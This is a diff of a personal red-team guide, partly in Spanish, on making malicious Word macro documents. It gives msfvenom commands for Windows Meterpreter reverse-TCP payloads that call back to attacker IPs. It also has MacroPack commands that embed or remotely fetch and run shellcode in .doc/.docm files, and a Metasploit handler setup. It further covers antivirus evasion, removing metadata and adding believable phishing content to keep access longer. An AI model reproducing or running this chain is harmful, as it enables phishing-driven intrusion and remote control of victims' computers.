@@ -10,33 +10,25 @@ In this post the idea is develop a guide to:
 2. Apply techniques to skip the AV protections or alerts
 
 ## malicious file
-### msfvenom
-Let's to create two malicious files, one for each kind of architecture
-```
-#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.123 LPORT=4444 -f vba -o ./exe.vba
 
-
-msfvenom -p windows/meterpreter/reverse_tcp LPORT=4444 LHOST=10.10.10.123 -f raw -o x86.bin
-msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=5555 LHOST=10.10.10.123 -f raw -o x64.bin
-```
 
 ### MacroPack
 https://github.com/sevagas/macro_pack
-Macropack if a tool that allow us to insert in a document a malicious executable
+Macropack if a tool that allow us to insert in a document a malicious executable. To execute macropack and get an outputfile we need execute it on windows with word package installed
 We install the dependencies using root privileges.
 ```
 git clone https://github.com/sevagas/macro_pack
 cd macro_pack
 
 python3 -m pip install --upgrade pip
-sudo python3 -m install -r requirements.txt
+sudo python3 -m pip install -r requirements.txt
 python3 -m pip install wsgidav
 cd src
 
 python3 ./macro_pack.py -h
 ```
 After the neccesary installation there is two beautiful ways for plannify the attack, first:
-Let's embedding both executables in a word file and when the code will be execute the correct one will be the one to be execute due to the processor detector.
+Let's embedding both executables in a _word file_ and when the code will be execute the correct one will be the one to be execute due to the processor detector.
 ```
 echo “x86.bin” “x64.bin” | macro_pack.exe -t AUTOSHELLCODE -o –autopack -G sc_auto.doc
 ```
@@ -46,9 +38,15 @@ echo "http://192.168.5.10:8080/x32calc.bin" "http://192.168.5.10:8080/x64calc.bi
 ```
 We define two url (One per each kind of processor) and the payload download the bin and execute without saving in the disk. Really beautiful.
 
+I just use:
+```
+python3 macro_pack.py -f /tmp/exe.vba -o -G myDoc.docm
+```
+
 We have to fix a pair of things at this point:
 1. We should delete the metadata 
-**How shoudl we do this?**
+**How should we do this?**
+
 2. We should fill with a credible content (In the same sense that que phising campain if we had it) to have more time to create a persistent conection with the compromised computer
 
 
@@ -69,3 +67,26 @@ msf6 exploit(multi/handler) > exploit
 ```
 
 **Me queda probarlo con una máquina virtual**
+
+
+
+-----------
+
+
+### msfvenom
+With metasploit we can get malicious code to 
+	a) Skip AV protection
+	b) to execute from macros for examples
+Let's to create two malicious files, one for each kind of architecture
+```
+#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.123 LPORT=4444 -f vba -o /tmp/exe.vba
+
+#or create one process per kind of procesor and later append both to the word
+msfvenom -p windows/meterpreter/reverse_tcp LPORT=4444 LHOST=10.10.10.123 -f raw -o x86.bin
+msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=5555 LHOST=10.10.10.123 -f raw -o x64.bin
+```
+
+or from 25 técnicas for redTeam
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.54.132 LPORT=4444 -f vba -o /tmp/exe.vba
+```
